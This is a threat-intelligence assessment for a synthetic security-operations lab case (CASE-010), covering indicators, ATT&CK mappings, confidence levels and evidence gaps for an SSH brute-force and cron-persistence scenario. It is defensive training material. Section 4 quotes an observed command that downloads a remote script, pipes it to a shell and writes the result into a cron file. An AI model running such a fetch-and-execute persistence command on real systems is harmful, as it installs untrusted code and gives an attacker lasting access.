# CASE-010 — Threat Intelligence Assessment

## 1. Purpose

This document records the threat-intelligence assessment for CASE-010.

The case uses synthetic SOC laboratory telemetry. Therefore, threat-intelligence conclusions are intentionally limited to what can be established from the supplied evidence.

No external reputation, ownership, attribution, or maliciousness claim is made for the laboratory indicators.

## 2. Intelligence Scope

The investigation contains the following potentially useful intelligence pivots:

* Source IP: `198.51.100.90`
* Download endpoint: `203.0.113.80`
* Resource: `/payload.sh`
* Host: `lab-linux-10`
* User: `root`
* Persistence path: `/etc/cron.d/system-update`

The IP addresses are documentation-network addresses used for the laboratory scenario.

They should therefore be treated as synthetic investigation values rather than production threat-intelligence indicators.

## 3. Source IP Assessment

### Indicator

```text
198.51.100.90
```

### Observed Context

The address is associated with:

* six failed SSH authentication attempts;
* a subsequent successful authentication;
* the post-authentication session;
* post-authentication commands; and
* the `DET-AUTH-001` and `DET-AUTH-003` detection outputs.

### Intelligence Assessment

The laboratory evidence establishes that this address participated in the synthetic authentication sequence.

It does not establish:

* real-world ownership;
* attacker identity;
* malicious infrastructure;
* reputation;
* geographic origin;
* botnet membership; or
* unauthorized access.

No external attribution should be inferred.

## 4. Download Endpoint Assessment

### Indicator

```text
203.0.113.80
```

### Observed Context

The endpoint appears in the following synthetic command:

```text
curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update
```

The command was associated with the suspicious Linux persistence event `EVT-010013`.

### Intelligence Assessment

The available telemetry establishes that the command referenced this endpoint.

It does not establish:

* whether the endpoint actually served content;
* whether the content was malicious;
* whether the connection succeeded;
* whether the payload executed successfully;
* infrastructure ownership;
* reputation; or
* association with a real threat actor.

The endpoint is therefore classified as a **synthetic laboratory network pivot**.

## 5. Resource Assessment

### Resource

```text
/payload.sh
```

The resource is referenced by the observed `curl` command.

The telemetry does not contain the actual contents of the resource.

Therefore, the investigation cannot establish:

* file hash;
* file type;
* script contents;
* malware family;
* capabilities;
* persistence behavior;
* command-and-control behavior; or
* payload execution success.

The resource should remain classified as an **observed command-line reference** rather than a confirmed malicious file.

## 6. Host and Identity Intelligence

### Host

```text
lab-linux-10
```

The host is a synthetic laboratory asset.

It is the common host pivot across all three correlated detection stages.

### User

```text
root
```

The account is associated with the complete correlated sequence.

Because `root` is privileged, activity involving the account receives elevated investigative priority.

The evidence does not establish whether the account was legitimately used.

## 7. Persistence Intelligence

### Persistence Path

```text
/etc/cron.d/system-update
```

This path is associated with `EVT-010013`.

The combination of:

* a cron persistence location;
* network retrieval;
* shell execution; and
* a hidden payload indicator

creates a high-priority investigation condition.

However, the telemetry does not establish that the resulting cron entry executed successfully.

## 8. ATT&CK Intelligence Context

The correlated detection references the following techniques:

| Technique   | Context                                                               |
| ----------- | --------------------------------------------------------------------- |
| `T1110`     | Repeated authentication failures consistent with brute-force behavior |
| `T1078`     | Successful authentication represented in the detection sequence       |
| `T1087`     | Account discovery activity                                            |
| `T1069.001` | Local permission/group discovery activity                             |
| `T1053.003` | Cron-based persistence activity                                       |

These mappings provide behavioral context for investigation.

They do not establish attacker intent or attribution.

## 9. Intelligence Confidence

| Intelligence Finding                             | Confidence   | Basis                                  |
| ------------------------------------------------ | ------------ | -------------------------------------- |
| Source IP participated in synthetic SSH activity | High         | Directly represented in telemetry      |
| Successful authentication occurred               | High         | Direct telemetry event                 |
| Post-authentication commands occurred            | High         | Direct telemetry events                |
| Cron persistence command was observed            | High         | Direct telemetry event                 |
| Download endpoint was referenced                 | High         | Direct command-line evidence           |
| Download succeeded                               | Unknown      | Not represented in available telemetry |
| Payload was malicious                            | Unknown      | Payload contents unavailable           |
| Persistence executed successfully                | Unknown      | Execution evidence unavailable         |
| Source IP belongs to an attacker                 | Unknown      | No attribution evidence                |
| Host was compromised                             | Undetermined | Requires additional evidence           |

## 10. Recommended Intelligence Enrichment

In a real SOC investigation, analysts could enrich the observed indicators through authorized intelligence sources.

Recommended checks include:

1. IP reputation lookup.
2. Autonomous System ownership.
3. Historical DNS information.
4. Passive DNS relationships.
5. URL reputation.
6. Malware sandbox analysis of the downloaded resource.
7. File-hash reputation after obtaining the actual file.
8. Certificate or infrastructure relationships where applicable.
9. Historical sightings across organizational telemetry.
10. Correlation with known threat-intelligence feeds.

These activities are recommendations only.

They were not performed as part of the synthetic CASE-010 scenario.

## 11. Intelligence Collection Requirements

To increase confidence, the investigation would benefit from:

* the actual contents of `/payload.sh`;
* a cryptographic hash of the payload;
* process execution telemetry;
* network connection telemetry;
* DNS telemetry;
* complete SSH authentication logs;
* cron configuration contents;
* file-system metadata;
* process ancestry;
* endpoint security telemetry; and
* authorization records.

These data sources could help distinguish suspicious activity from legitimate administration.

## 12. Intelligence Gaps

Current intelligence gaps include:

* no real infrastructure attribution;
* no payload contents;
* no payload hash;
* no confirmed network connection;
* no confirmed payload execution;
* no confirmed persistence execution;
* no complete authentication history;
* no process ancestry;
* no external reputation data; and
* no independent evidence of unauthorized access.

These gaps prevent a definitive compromise determination.

## 13. Analyst Assessment

The strongest intelligence conclusion supported by the current evidence is:

> The synthetic telemetry contains a coherent sequence of authentication attack activity, successful authentication, post-authentication privileged/discovery activity, and suspicious cron persistence involving a referenced download endpoint.

The evidence is sufficient to justify continued investigation.

It is not sufficient to establish real-world attacker attribution, malicious infrastructure, or confirmed compromise.

## 14. Laboratory Handling

All indicators in this case must remain clearly identified as laboratory data.

The following values must not be presented as real-world threat intelligence:

```text
198.51.100.90
203.0.113.80
lab-linux-10
SES-010-A
EVT-010001–EVT-010014
```

The case should not claim external threat-intelligence enrichment unless such enrichment is actually performed and documented.

## 15. Conclusion

CASE-010 demonstrates how threat intelligence can support an investigation without overstating evidence.

The available evidence provides useful investigative pivots but does not provide sufficient information for attribution or definitive compromise classification.

The appropriate intelligence posture is therefore:

```text
Observed indicator
        ↓
Contextual enrichment
        ↓
Evidence validation
        ↓
Confidence assessment
        ↓
Investigative conclusion
```

For this laboratory case, the process reaches the **investigative conclusion** stage without claiming real-world attribution or confirmed compromise.
